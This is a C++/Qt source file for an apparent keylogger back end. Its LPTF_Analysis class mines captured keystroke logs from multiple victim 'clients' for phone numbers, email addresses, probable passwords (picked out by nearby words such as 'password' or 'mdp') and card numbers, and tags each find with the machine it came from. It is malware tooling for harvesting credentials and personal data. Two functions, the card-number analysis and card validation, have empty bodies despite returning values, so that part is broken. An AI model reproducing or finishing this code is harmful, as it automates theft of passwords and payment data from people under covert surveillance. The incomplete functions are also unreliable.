#include "LPTF_Analysis.hpp"
#include <QDebug>
#include <QRegularExpressionMatchIterator>

/**
 * @brief Constructor - initializes regex patterns
 */
LPTF_Analysis::LPTF_Analysis()
{
    initializePatterns();
}

/**
 * @brief Destructor
 */
LPTF_Analysis::~LPTF_Analysis()
{
}

/**
 * @brief Initialize regex patterns for different data types
 */
void LPTF_Analysis::initializePatterns()
{
    // Phone number patterns (French and international formats)
    phonePattern_.setPattern(R"((?:\+33|0)[1-9](?:[0-9]{8})|(?:\+\d{1,3}[\s\-\.]?)?\d{1,4}[\s\-\.]?\d{1,4}[\s\-\.]?\d{1,9})");
    
    // Email pattern
    emailPattern_.setPattern(R"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})");
    
    // Credit card pattern (basic 13-19 digits with optional spaces/dashes)
    creditCardPattern_.setPattern(R"(\b(?:\d{4}[\s\-]?){3,4}\d{1,4}\b)");
    
    // Password pattern - sequences that might be passwords
    // Looking for sequences with mixed case, numbers, or special chars
    passwordPattern_.setPattern(R"((?=.*[a-zA-Z])(?=.*[\d\W])[^\s]{6,20})");
}

/**
 * @brief Main analysis function that processes all keylog data
 * @param keylogs List of keylog strings to analyze
 * @return Map of analysis results by type
 */
QMap<QString, AnalysisResult> LPTF_Analysis::analyzeKeylogs(const QStringList& keylogs)
{
    QMap<QString, AnalysisResult> results;
    
    // Initialize result structures
    results["phones"] = AnalysisResult();
    results["phones"].type = "Numéros de téléphone";
    
    results["emails"] = AnalysisResult();
    results["emails"].type = "Adresses email";
    
    results["passwords"] = AnalysisResult();
    results["passwords"].type = "Mots de passe potentiels";
    
    results["cards"] = AnalysisResult();
    results["cards"].type = "Numéros de cartes bancaires";
    
    // Process each keylog entry
    for (const QString& keylog : keylogs) {
        if (keylog.trimmed().isEmpty()) continue;
        
        // Analyze phones
        AnalysisResult phoneResult = analyzePhoneNumbers(keylog);
        results["phones"].matches.append(phoneResult.matches);
        results["phones"].contexts.append(phoneResult.contexts);
        results["phones"].totalCount += phoneResult.totalCount;
        
        // Analyze emails
        AnalysisResult emailResult = analyzeEmailAddresses(keylog);
        results["emails"].matches.append(emailResult.matches);
        results["emails"].contexts.append(emailResult.contexts);
        results["emails"].totalCount += emailResult.totalCount;
        
        // Analyze passwords
        AnalysisResult passwordResult = analyzePotentialPasswords(keylog);
        results["passwords"].matches.append(passwordResult.matches);
        results["passwords"].contexts.append(passwordResult.contexts);
        results["passwords"].totalCount += passwordResult.totalCount;
        
        // Analyze credit cards
        AnalysisResult cardResult = analyzeCreditCardNumbers(keylog);
        results["cards"].matches.append(cardResult.matches);
        results["cards"].contexts.append(cardResult.contexts);
        results["cards"].totalCount += cardResult.totalCount;
    }
    
    // Remove duplicates from results
    for (auto& result : results) {
        result.matches.removeDuplicates();
        result.contexts.removeDuplicates();
        result.totalCount = result.matches.size();
    }
    
    return results;
}

/**
 * @brief Main analysis function that processes keylog data with client information
 * @param keylogsWithClients Map of keylog strings to client information
 * @return Map of analysis results by type
 */
QMap<QString, AnalysisResult> LPTF_Analysis::analyzeKeylogsWithClients(const QMap<QString, QString>& keylogsWithClients)
{
    QMap<QString, AnalysisResult> results;
    
    // Initialize result structures
    results["phones"] = AnalysisResult();
    results["phones"].type = "Numéros de téléphone";
    
    results["emails"] = AnalysisResult();
    results["emails"].type = "Adresses email";
    
    results["passwords"] = AnalysisResult();
    results["passwords"].type = "Mots de passe potentiels";
    
    results["cards"] = AnalysisResult();
    results["cards"].type = "Numéros de cartes bancaires";
    
    // Process each keylog entry with its client information
    for (auto it = keylogsWithClients.begin(); it != keylogsWithClients.end(); ++it) {
        const QString& keylog = it.key();
        const QString& clientInfo = it.value();
        
        if (keylog.trimmed().isEmpty()) continue;
        
        // Analyze phones
        AnalysisResult phoneResult = analyzePhoneNumbers(keylog);
        for (int i = 0; i < phoneResult.matches.size(); ++i) {
            results["phones"].matches.append(phoneResult.matches[i]);
            results["phones"].contexts.append(phoneResult.contexts[i]);
            results["phones"].clientSources.append(clientInfo);
        }
        results["phones"].totalCount += phoneResult.totalCount;
        
        // Analyze emails
        AnalysisResult emailResult = analyzeEmailAddresses(keylog);
        for (int i = 0; i < emailResult.matches.size(); ++i) {
            results["emails"].matches.append(emailResult.matches[i]);
            results["emails"].contexts.append(emailResult.contexts[i]);
            results["emails"].clientSources.append(clientInfo);
        }
        results["emails"].totalCount += emailResult.totalCount;
        
        // Analyze passwords
        AnalysisResult passwordResult = analyzePotentialPasswords(keylog);
        for (int i = 0; i < passwordResult.matches.size(); ++i) {
            results["passwords"].matches.append(passwordResult.matches[i]);
            results["passwords"].contexts.append(passwordResult.contexts[i]);
            results["passwords"].clientSources.append(clientInfo);
        }
        results["passwords"].totalCount += passwordResult.totalCount;
        
        // Analyze credit cards
        AnalysisResult cardResult = analyzeCreditCardNumbers(keylog);
        for (int i = 0; i < cardResult.matches.size(); ++i) {
            results["cards"].matches.append(cardResult.matches[i]);
            results["cards"].contexts.append(cardResult.contexts[i]);
            results["cards"].clientSources.append(clientInfo);
        }
        results["cards"].totalCount += cardResult.totalCount;
    }
    
    // Remove duplicates from results while preserving client sources
    for (auto& result : results) {
        // Create a map to track unique matches with their first occurrence client
        QMap<QString, QPair<QString, QString>> uniqueMatches; // match -> (context, client)
        
        for (int i = 0; i < result.matches.size(); ++i) {
            QString match = result.matches[i];
            QString context = (i < result.contexts.size()) ? result.contexts[i] : "";
            QString client = (i < result.clientSources.size()) ? result.clientSources[i] : "";
            
            if (!uniqueMatches.contains(match)) {
                uniqueMatches[match] = QPair<QString, QString>(context, client);
            }
        }
        
        // Rebuild the lists with unique entries
        result.matches.clear();
        result.contexts.clear();
        result.clientSources.clear();
        
        for (auto it = uniqueMatches.begin(); it != uniqueMatches.end(); ++it) {
            result.matches.append(it.key());
            result.contexts.append(it.value().first);
            result.clientSources.append(it.value().second);
        }
        
        result.totalCount = result.matches.size();
    }
    
    return results;
}

/**
 * @brief Analyze text for phone numbers
 * @param text Input text to analyze
 * @return Analysis result with found phone numbers
 */
AnalysisResult LPTF_Analysis::analyzePhoneNumbers(const QString& text)
{
    AnalysisResult result;
    result.type = "Numéros de téléphone";
    
    QRegularExpressionMatchIterator it = phonePattern_.globalMatch(text);
    while (it.hasNext()) {
        QRegularExpressionMatch match = it.next();
        QString phone = cleanPhoneNumber(match.captured(0));
        
        // Basic validation - must be at least 8 digits
        QString digitsOnly = phone;
        digitsOnly.remove(QRegularExpression(R"([^\d])"));
        
        if (digitsOnly.length() >= 8) {
            result.matches.append(phone);
            result.contexts.append(extractContext(text, match.capturedStart()));
        }
    }
    
    result.totalCount = result.matches.size();
    return result;
}

/**
 * @brief Analyze text for email addresses
 * @param text Input text to analyze
 * @return Analysis result with found email addresses
 */
AnalysisResult LPTF_Analysis::analyzeEmailAddresses(const QString& text)
{
    AnalysisResult result;
    result.type = "Adresses email";
    
    QRegularExpressionMatchIterator it = emailPattern_.globalMatch(text);
    while (it.hasNext()) {
        QRegularExpressionMatch match = it.next();
        QString email = match.captured(0).toLower();
        
        result.matches.append(email);
        result.contexts.append(extractContext(text, match.capturedStart()));
    }
    
    result.totalCount = result.matches.size();
    return result;
}

/**
 * @brief Analyze text for potential passwords
 * @param text Input text to analyze
 * @return Analysis result with potential passwords
 */
AnalysisResult LPTF_Analysis::analyzePotentialPasswords(const QString& text)
{
    AnalysisResult result;
    result.type = "Mots de passe potentiels";
    
    // Look for common password patterns in context
    QStringList passwordIndicators = {
        "password", "passwd", "pwd", "pass", "mdp", "motdepasse",
        "login", "connexion", "compte", "account"
    };
    
    QRegularExpressionMatchIterator it = passwordPattern_.globalMatch(text);
    while (it.hasNext()) {
        QRegularExpressionMatch match = it.next();
        QString candidate = match.captured(0);
        QString context = extractContext(text, match.capturedStart(), 100);
        QString contextLower = context.toLower();
        
        // Check if context contains password-related keywords
        bool hasPasswordContext = false;
        for (const QString& indicator : passwordIndicators) {
            if (contextLower.contains(indicator)) {
                hasPasswordContext = true;
                break;
            }
        }
        
        if (hasPasswordContext) {
            result.matches.append(candidate);
            result.contexts.append(context);
        }
    }
    
    result.totalCount = result.matches.size();
    return result;
}


AnalysisResult LPTF_Analysis::analyzeCreditCardNumbers(const QString& text)
{

}

/**
 * @brief Extract context around a match position
 * @param text Full text
 * @param position Position of the match
 * @param contextLength Number of characters to include on each side
 * @return Context string
 */
QString LPTF_Analysis::extractContext(const QString& text, int position, int contextLength)
{
    int start = qMax(0, position - contextLength);
    int end = qMin(text.length(), position + contextLength);
    
    QString context = text.mid(start, end - start);
    
    // Add ellipsis if truncated
    if (start > 0) context = "..." + context;
    if (end < text.length()) context = context + "...";
    
    return context;
}


bool LPTF_Analysis::isValidCreditCard(const QString& cardNumber)
{

}

/**
 * @brief Clean phone number by normalizing format
 * @param phone Raw phone number
 * @return Cleaned phone number
 */
QString LPTF_Analysis::cleanPhoneNumber(const QString& phone)
{
    QString cleaned = phone;
    
    // Remove extra spaces and normalize separators
    cleaned.replace(QRegularExpression(R"(\s+)"), " ");
    cleaned = cleaned.trimmed();
    
    return cleaned;
}